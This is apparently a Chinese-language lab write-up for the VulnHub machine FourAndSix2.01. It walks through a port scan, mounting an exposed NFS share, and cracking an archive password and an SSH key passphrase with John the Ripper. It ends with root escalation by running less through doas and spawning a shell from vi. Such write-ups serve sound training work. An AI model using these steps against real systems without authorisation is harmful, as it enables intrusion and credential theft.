+++
title = '0x002 FourAndSix2.01'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



# IP&端口扫描

```
sudo nmap -Pn -sS -p- -sV  192.168.154.130
```

![](/vulnhub_img/WEBRESOURCE45460ef9fe8d8f4de9fccc017dd36244截图.png)

# 挂载NFS

```
sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage
```

# 破解解压密码

```
7z2john backup.7z > hash3
john -wordlist=/usr/share/wordlists/rockyou.txt hash3
```

# 发现图片和私钥

图片内没有东西，私钥链接需要密码：

![](/vulnhub_img/WEBRESOURCEb78f860910caa1eafc7b0f4a9b55bff5截图.png)

# 破解rsa私钥密码

方式与上面一致

![](/vulnhub_img/WEBRESOURCE38b881339b33a84247dd712004ba787e截图.png)

# 提权

SUID提权：

```
find / -perm -u=s -type f 2>/dev/null
```

![](/vulnhub_img/WEBRESOURCE3897cdce7c776f8933a5f679f20638de截图.png)

查找命令相关文件：

```
find / -name *doas* -type f 2>/dev/null
```

![](/vulnhub_img/WEBRESOURCEfaa371dfa93e8d3cbfb15e92deab123d截图.png)

根据提示来看，使用以下命令：

```
doas /usr/bin/less /var/log/authlog
```

然后按V来使用VI编辑器，然后输入：！sh来获得root shell

![](/vulnhub_img/WEBRESOURCE1a69288e2eed33e3a2ca48eb14b0a473截图.png)

# 总结

用doas的高权限运行/usr/bin/less查看/var/log/authlog，然后调用VI编辑器，通过VI编辑器可以获得高权限sh shell。